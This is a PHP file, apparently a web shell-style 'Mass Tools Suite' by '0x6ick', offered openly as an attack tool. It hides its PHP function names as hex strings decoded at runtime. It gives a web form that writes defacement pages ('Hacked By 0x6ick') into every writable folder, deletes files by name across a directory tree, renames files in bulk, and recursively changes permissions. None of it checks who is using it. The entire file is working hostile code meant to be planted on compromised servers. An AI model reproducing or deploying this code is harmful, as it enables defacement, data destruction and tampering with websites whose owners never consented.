<?php
/**
 * ヤミRoot :: Mass Tools Suite  | by 0x6ick
 * A collection of tools for mass file operations.
 * The author is not responsible for any data loss or damage from misuse.
 * =================================================================
 * Github: /6ickzone | Blog: 0x6ick.my.id 
 * =================================================================
 */

// --- CORE FUNCTIONS ---
$f = [ "6572726f725f7265706f7274696e67", "73657373696f6e5f7374617274", "696e695f736574", "686561646572", "6f625f656e645f636c65616e", "626173656e616d65", "66756e6374696f6e5f657869737473", "65786563", "696d706c6f6465", "7368656c6c5f65786563", "7061737374687275", "6f625f7374617274", "6f625f6765745f636c65616e", "73797374656d", "66696c657065726d73", "737072696e7466", "66696c655f657869737473", "69735f646972", "756e6c696e6b", "7363616e646972", "726d646972", "737562737472", "687474705f6275696c645f7175657279", "7265616c70617468", "676574637764", "7374725f7265706c616365", "69735f7772697461626c65", "66696c655f7075745f636f6e74656e7473", "68746d6c7370656369616c6368617273", "69735f66696c65", "737472706f73", "72656e616d65", "63686d6f64", "6f6374646563" ];
foreach ($f as $k => $v) { $f[$k] = hex2bin($v); } unset($k, $v);

// --- SETUP ---
$f[0](0);
$f[1]();
@$f[2]('output_buffering', 0);
@$f[2]('display_errors', 0);
$f[3]('Content-Type: text/html; charset=UTF-8');
$f[4]();

// --- CONFIG ---
$title = "Mass Tools Suite";
$author = "0x6ick";
$theme_bg = "black";
$theme_fg = "#00FFFF";
$theme_border_color = "#00FFFF";
$message_success_color = "#00CCFF";
$message_error_color = "red";

// --- HELPERS ---
function redirect_with_message($msg_type = '', $msg_text = '', $tool = '') {
    global $f;
    $params = [];
    if ($tool) $params['tool'] = $tool;
    if ($msg_type) $params['msg_type'] = $msg_type;
    if ($msg_text) $params['msg_text'] = $msg_text;
    $f[3]("Location: ?" . $f[22]($params));
    exit();
}

// --- TOOL FUNCTIONS ---
function mass_deface_recursive($dir, $file, $content, &$res) { global $f; if(!$f[26]($dir)) { $res .= "[<font color=red>FAIL</font>] ".$f[28]($dir)." (Not writable)<br>"; return; } foreach($f[19]($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if($f[17]($lokasi)) { if($f[26]($lokasi)) { $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>SUCCESS</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; mass_deface_recursive($lokasi, $file, $content, $res); } else { $res .= "[<font color=red>FAIL</font>] ".$f[28]($lokasi)." (Not writable)<br>"; } } } }
function mass_deface_flat($dir, $file, $content, &$res) { global $f; if(!$f[26]($dir)) { $res .= "[<font color=red>FAIL</font>] ".$f[28]($dir)." (Not writable)<br>"; return; } foreach($f[19]($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if($f[17]($lokasi) && $f[26]($lokasi)) { $f[27]($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>SUCCESS</font>] ".$f[28]($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; } } }
function mass_delete_recursive($dir, $filename, &$res) { global $f; if(!$f[16]($dir)) return; foreach($f[19]($dir) as $item) { if($item === '.' || $item === '..') continue; $path = $dir . DIRECTORY_SEPARATOR . $item; if($f[17]($path)) { mass_delete_recursive($path, $filename, $res); } else if ($item === $filename && $f[29]($path)) { if ($f[18]($path)) { $res .= "[<font color=lime>SUCCESS</font>] File deleted: ".$f[28]($path)."<br>"; } else { $res .= "[<font color=red>FAIL</font>] Failed to delete: ".$f[28]($path)."<br>"; } } } }
function mass_delete_flat($dir, $filename, &$res) { global $f; if(!$f[16]($dir)) return; foreach($f[19]($dir) as $item) { if($item === '.' || $item === '..') continue; $path = $dir . DIRECTORY_SEPARATOR . $item; if ($item === $filename && $f[29]($path)) { if ($f[18]($path)) { $res .= "[<font color=lime>SUCCESS</font>] File deleted: ".$f[28]($path)."<br>"; } else { $res .= "[<font color=red>FAIL</font>] Failed to delete: ".$f[28]($path)."<br>"; } } } }
function mass_rename_recursive($dir, $from, $to, &$res) { global $f; if(!$f[16]($dir)) return; foreach($f[19]($dir) as $item) { if($item === '.' || $item === '..') continue; $old_path = $dir . DIRECTORY_SEPARATOR . $item; if($f[17]($old_path)) { mass_rename_recursive($old_path, $from, $to, $res); } else if($f[29]($old_path) && $f[30]($item, $from) !== false) { $new_item = $f[25]($from, $to, $item); $new_path = $dir . DIRECTORY_SEPARATOR . $new_item; if($f[16]($new_path)) { $res .= "[<font color=orange>SKIPPED</font>] Destination file already exists: ".$f[28]($new_path)."<br>"; } else { if($f[31]($old_path, $new_path)) { $res .= "[<font color=lime>SUCCESS</font>] ".$f[28]($old_path)." -> ".$f[28]($new_path)."<br>"; } else { $res .= "[<font color=red>FAIL</font>] Failed to rename: ".$f[28]($old_path)."<br>"; } } } } }
function mass_rename_flat($dir, $from, $to, &$res) { global $f; if(!$f[16]($dir)) return; foreach($f[19]($dir) as $item) { if($item === '.' || $item === '..') continue; $old_path = $dir . DIRECTORY_SEPARATOR . $item; if($f[29]($old_path) && $f[30]($item, $from) !== false) { $new_item = $f[25]($from, $to, $item); $new_path = $dir . DIRECTORY_SEPARATOR . $new_item; if($f[16]($new_path)) { $res .= "[<font color=orange>SKIPPED</font>] Destination file already exists: ".$f[28]($new_path)."<br>"; } else { if($f[31]($old_path, $new_path)) { $res .= "[<font color=lime>SUCCESS</font>] ".$f[28]($old_path)." -> ".$f[28]($new_path)."<br>"; } else { $res .= "[<font color=red>FAIL</font>] Failed to rename: ".$f[28]($old_path)."<br>"; } } } } }
function mass_chmod_recursive($path, $file_perm, $dir_perm, &$res) { global $f; $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST); foreach($iterator as $item) { $current_path = $item->getPathname(); if ($item->isDir()) { if ($f[32]($current_path, $dir_perm)) { $res .= "[<font color=lime>DIR OK</font>] ".$f[28]($current_path)." -> ".sprintf('%o', $dir_perm)."<br>"; } else { $res .= "[<font color=red>DIR FAIL</font>] Failed to chmod ".$f[28]($current_path)."<br>"; } } else { if ($f[32]($current_path, $file_perm)) { $res .= "[<font color=cyan>FILE OK</font>] ".$f[28]($current_path)." -> ".sprintf('%o', $file_perm)."<br>"; } else { $res .= "[<font color=red>FILE FAIL</font>] Failed to chmod ".$f[28]($current_path)."<br>"; } } } }

// --- ACTION HANDLERS ---
if(isset($_POST['start_mass_deface'])) { $mass_deface_results = ''; if($_POST['tipe_sabun'] == 'mahal') { mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); } else { mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); } $_SESSION['feature_output'] = $mass_deface_results; redirect_with_message('success', 'Mass Deface Completed!', 'deface'); }
if(isset($_POST['start_mass_delete'])) { $mass_delete_results = ''; $target_filename = $_POST['target_filename']; if(empty($target_filename)) { redirect_with_message('error', 'Target filename cannot be empty!', 'delete'); } if($_POST['delete_type'] == 'recursive') { mass_delete_recursive($_POST['target_dir'], $target_filename, $mass_delete_results); } else { mass_delete_flat($_POST['target_dir'], $target_filename, $mass_delete_results); } $_SESSION['feature_output'] = $mass_delete_results; redirect_with_message('success', 'Mass Delete Completed!', 'delete'); }
if(isset($_POST['start_mass_rename'])) { $mass_rename_results = ''; $rename_from = $_POST['rename_from']; $rename_to = $_POST['rename_to']; if(empty($rename_from)) { redirect_with_message('error', 'Text to find cannot be empty!', 'rename'); } if($rename_from === $rename_to) { redirect_with_message('error', 'Old and new text cannot be the same!', 'rename'); } if($_POST['rename_type'] == 'recursive') { mass_rename_recursive($_POST['target_dir'], $rename_from, $rename_to, $mass_rename_results); } else { mass_rename_flat($_POST['target_dir'], $rename_from, $rename_to, $mass_rename_results); } $_SESSION['feature_output'] = $mass_rename_results; redirect_with_message('success', 'Mass Rename Completed!', 'rename'); }
if(isset($_POST['start_mass_chmod'])) { $mass_chmod_results = ''; $dir_perm = $f[33]($_POST['dir_perm']); $file_perm = $f[33]($_POST['file_perm']); mass_chmod_recursive($_POST['target_dir'], $file_perm, $dir_perm, $mass_chmod_results); $_SESSION['feature_output'] = $mass_chmod_results; redirect_with_message('success', 'Mass CHMOD Completed!', 'chmod'); }

$path = $f[24]();
$active_tool = isset($_GET['tool']) ? $_GET['tool'] : 'deface';
?>
<!DOCTYPE HTML>
<html>
<head>
    <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
    <title><?php echo $f[28]($title); ?></title>
    <style>
        body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:15px;}
        h1, h3 {font-family:'Kelly Slab';color:white;text-align:center;}
        h1 {font-size:35px; margin:20px 0 10px;}
        input,select,textarea{border:1px solid <?php echo $theme_border_color; ?>;border-radius:5px;background:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;font-family:'Kelly Slab',cursive;padding:8px;box-sizing:border-box;width:100%;}
        input[type="submit"]{background:<?php echo $theme_fg;?>;color:<?php echo $theme_bg;?>;border:2px solid <?php echo $theme_bg;?>;cursor:pointer;font-weight:bold;margin-top:10px;}
        input[type="submit"]:hover{background:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>; border-color: <?php echo $theme_fg;?>;}
        .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:800px;font-weight:bold;text-align:center; color: #111;}
        .message.success{background-color:<?php echo $message_success_color;?>;}
        .message.error{background-color:<?php echo $message_error_color;?>;}
        .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:800px;}
        .warning-box {background-color:#4d0000; border: 1px solid red; color: white; padding: 15px; margin-bottom: 20px; text-align: center; border-radius: 5px;}
        pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;max-height: 400px;}
        label { margin-bottom: 5px; display: block; }
        .nav-menu { text-align: center; background-color: #1a1a1a; padding: 10px; border-radius: 5px; border: 1px solid <?php echo $theme_border_color;?>; margin: 20px auto; width:95%; max-width: 800px;}
        .nav-menu a { color: <?php echo $theme_fg; ?>; text-decoration: none; padding: 8px 15px; margin: 0 5px; border-radius: 4px; }
        .nav-menu a:hover { background-color: <?php echo $theme_fg; ?>; color: <?php echo $theme_bg; ?>; }
        .nav-menu a.active { background-color: <?php echo $theme_fg; ?>; color: <?php echo $theme_bg; ?>; font-weight: bold; }
    </style>
</head>
<body>

<h1><?php echo $f[28]($title); ?></h1>

<div class="warning-box">
    <strong>WARNING!</strong> 
    <a href="https://t.me/Yungx6ick" target="_blank" style="color: inherit; text-decoration: underline;">
        MassToolsSuite
    </a>
</div>

<div class="nav-menu">
    <a href="?tool=deface" class="<?php if($active_tool == 'deface') echo 'active'; ?>">Mass Deface</a>
    <a href="?tool=delete" class="<?php if($active_tool == 'delete') echo 'active'; ?>">Mass Delete</a>
    <a href="?tool=rename" class="<?php if($active_tool == 'rename') echo 'active'; ?>">Mass Rename</a>
    <a href="?tool=chmod" class="<?php if($active_tool == 'chmod') echo 'active'; ?>">Mass CHMOD</a>
</div>

<?php
if(isset($_GET['msg_text'])) {
    echo "<div class='message ".$f[28]($_GET['msg_type'])."'>".$f[28]($_GET['msg_text'])."</div>";
}
if(isset($_SESSION['feature_output'])) {
    $output = !empty($_SESSION['feature_output']) ? $_SESSION['feature_output'] : 'No changes were made or target files were not found.';
    echo '<div class="section-box"><h3>Last Process Results:</h3><pre>'.$output.'</pre></div>';
    unset($_SESSION['feature_output']);
}
?>

<?php // --- DYNAMIC CONTENT RENDER --- ?>

<?php if ($active_tool == 'deface'): ?>
<div class="section-box">
    <h3>Mass Deface Tool</h3>
    <form method="post" action="?tool=deface">
        <label>Type:</label>
        <input type="radio" name="tipe_sabun" value="murah" checked style="width:auto;"> <label style="display:inline;">Normal (Target folder only)</label><br>
        <input type="radio" name="tipe_sabun" value="mahal" style="width:auto;"> <label style="display:inline;">Massive (Recursive / all sub-folders)</label>
        <br><br>
        <label for="d_dir">Target Folder:</label>
        <input type="text" id="d_dir" name="d_dir" value="<?php echo $f[28]($path); ?>">
        <br><br>
        <label for="d_file">Deface Filename:</label>
        <input type="text" id="d_file" name="d_file" value="index.html">
        <br><br>
        <label for="script_content">Script Content / HTML:</label>
        <textarea id="script_content" name="script_content" style="height:150px">Hacked By 0x6ick</textarea>
        <input type="submit" name="start_mass_deface" value="EXECUTE!">
    </form>
</div>
<?php endif; ?>

<?php if ($active_tool == 'delete'): ?>
<div class="section-box">
    <h3>Mass Delete Tool</h3>
    <form method="post" action="?tool=delete" onsubmit="return confirm('ARE YOU SURE YOU WANT TO MASS DELETE FILES? THIS ACTION CANNOT BE UNDONE!');">
        <label>Delete Mode:</label>
        <input type="radio" name="delete_type" value="flat" checked style="width:auto;"> <label style="display:inline;">Normal (This folder only)</label><br>
        <input type="radio" name="delete_type" value="recursive" style="width:auto;"> <label style="display:inline;">Recursive (Includes all sub-folders)</label>
        <br><br>
        <label for="target_dir_del">Target Folder:</label>
        <input type="text" id="target_dir_del" name="target_dir" value="<?php echo $f[28]($path); ?>">
        <br><br>
        <label for="target_filename">Filename to Delete (case-sensitive):</label>
        <input type="text" id="target_filename" name="target_filename" placeholder="e.g., index.html" required>
        <br><br>
        <input type="submit" name="start_mass_delete" value="DELETE THESE FILES">
    </form>
</div>
<?php endif; ?>

<?php if ($active_tool == 'rename'): ?>
<div class="section-box">
    <h3>Mass Rename Tool</h3>
    <p style="text-align:center; font-size: 0.9em; color: #ccc;">This tool will find files whose names contain the 'Old Text' and replace it with the 'New Text'.</p>
    <form method="post" action="?tool=rename">
        <label>Rename Mode:</label>
        <input type="radio" name="rename_type" value="flat" checked style="width:auto;"> <label style="display:inline;">Normal (This folder only)</label><br>
        <input type="radio" name="rename_type" value="recursive" style="width:auto;"> <label style="display:inline;">Recursive (Includes all sub-folders)</label>
        <br><br>
        <label for="target_dir_ren">Target Folder:</label>
        <input type="text" id="target_dir_ren" name="target_dir" value="<?php echo $f[28]($path); ?>">
        <br><br>
        <label for="rename_from">Find Text in Filename:</label>
        <input type="text" id="rename_from" name="rename_from" placeholder="Old text, e.g., backup_" required>
        <br><br>
        <label for="rename_to">Replace With This Text:</label>
        <input type="text" id="rename_to" name="rename_to" placeholder="New text, e.g., archive_">
        <br><br>
        <input type="submit" name="start_mass_rename" value="RUN RENAME">
    </form>
</div>
<?php endif; ?>

<?php if ($active_tool == 'chmod'): ?>
<div class="section-box">
    <h3>Mass CHMOD Tool</h3>
    <p style="text-align:center; font-size: 0.9em; color: #ccc;">Recursively change file & folder permissions.</p>
    <form method="post" action="?tool=chmod" onsubmit="return confirm('Are you sure you want to change permissions for all files and folders within the target directory?');">
        <label for="target_dir_chmod">Target Folder:</label>
        <input type="text" id="target_dir_chmod" name="target_dir" value="<?php echo $f[28]($path); ?>">
        <br><br>
        <label for="dir_perm">Permission for FOLDERS (e.g., 0755):</label>
        <input type="text" id="dir_perm" name="dir_perm" value="0755" required>
        <br><br>
        <label for="file_perm">Permission for FILES (e.g., 0644):</label>
        <input type="text" id="file_perm" name="file_perm" value="0644" required>
        <br><br>
        <input type="submit" name="start_mass_chmod" value="CHANGE PERMISSIONS">
    </form>
</div>
<?php endif; ?>

<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 800px; margin: 25px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo $f[28]($author); ?></font></b></center>

</body>
</html>
